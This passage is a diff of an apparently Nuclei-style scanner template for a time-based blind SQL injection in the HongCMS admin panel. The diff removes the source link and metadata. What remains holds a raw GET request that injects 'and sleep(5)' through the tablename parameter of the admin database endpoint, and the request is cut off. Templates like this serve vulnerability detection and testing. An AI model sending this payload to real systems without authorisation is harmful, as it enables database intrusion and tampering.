@@ -3,14 +3,8 @@ info:
   name: HongCMS 后台注入漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/dnmhov617ux6d6m4
-
-    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: other,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: dnmhov617ux6d6m4
-    fofa: 暂无
 http:
 - raw:
   - 'GET /admin/index.php/database/operate?dbaction=emptytable&tablename=hong_acat`+where+cat_id=2+and+sleep(5);%23 HTTP/1.1
